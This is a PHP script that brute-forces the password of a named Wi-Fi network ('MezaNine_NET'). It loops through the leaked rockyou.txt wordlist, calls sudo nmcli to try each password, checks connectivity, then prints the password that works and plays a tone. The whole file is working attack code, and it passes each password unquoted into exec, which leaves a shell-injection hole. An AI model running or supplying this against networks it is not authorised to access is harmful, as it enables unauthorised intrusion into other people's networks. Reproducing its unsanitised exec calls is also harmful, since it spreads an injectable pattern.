<?php
    $mypwdfile = fopen("rockyou.txt", "r");

    $myconfile = fopen("connectivity.txt", "r");
	
    $counter = 0;

    while(!feof($mypwdfile)){

        $password = trim(fgets($mypwdfile));

        exec("sudo nmcli d wifi connect 'MezaNine_NET' password $password ifname wlp1s0");

        exec("sudo nmcli networking connectivity > connectivity.txt");    
        
        $status = trim(fgets($myconfile));
       
            if($status == "limited" || $status == "full"){
                echo "the work is done";
                echo "\n";
                echo $password;
                echo "\n";
                echo $status;
		exec("speaker-test -t sine -f 1000 -l  1");
                echo "\n";
                break;
            }
	$counter = $counter + 1;
	
	echo $counter;
	
        //returning the file pointer to the begining of the file

        rewind($myconfile);
    }
?>
